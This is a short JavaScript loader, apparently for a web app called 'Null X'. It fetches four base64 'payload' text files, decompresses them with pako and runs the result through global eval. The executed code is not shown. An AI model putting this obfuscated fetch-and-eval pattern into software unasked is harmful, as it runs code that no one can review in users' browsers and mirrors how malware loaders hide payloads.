(function(){
  const parts = ["JS/payload0.txt","JS/payload1.txt","JS/payload2.txt","JS/payload3.txt"];
  const s = document.createElement("script");
  s.src = "https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js";
  s.onload = async function() {
    try {
      const texts = await Promise.all(parts.map(p => fetch("/" + p + "?t=" + Date.now()).then(r => r.text())));
      const b64 = texts.join("").trim();
      const data = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
      const code = pako.inflate(data, { to: "string" });
      (0, eval)(code);
    } catch (e) {
      console.error("Null X core load failed", e);
      document.body.innerHTML = "<pre style=\"color:#f0f;background:#000;padding:20px\">Failed to load core: "+e+"</pre>";
    }
  };
  document.head.appendChild(s);
})();
